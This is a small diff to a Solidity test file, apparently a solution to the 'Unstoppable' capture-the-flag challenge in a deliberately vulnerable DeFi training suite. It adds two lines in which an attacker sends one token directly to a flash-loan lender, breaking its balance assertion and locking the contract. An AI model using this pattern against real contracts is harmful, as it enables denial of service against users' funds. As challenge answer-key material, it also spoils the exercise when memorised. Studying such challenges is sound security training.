@@ -60,7 +60,8 @@ contract Unstoppable is DSTest {
 
     function testExploit() public {
         /** EXPLOIT START **/
-
+        vm.prank(attacker);
+        dvt.transfer(address(unstoppableLender), 1);
         /** EXPLOIT END **/
         vm.expectRevert(UnstoppableLender.AssertionViolated.selector);
         validation();
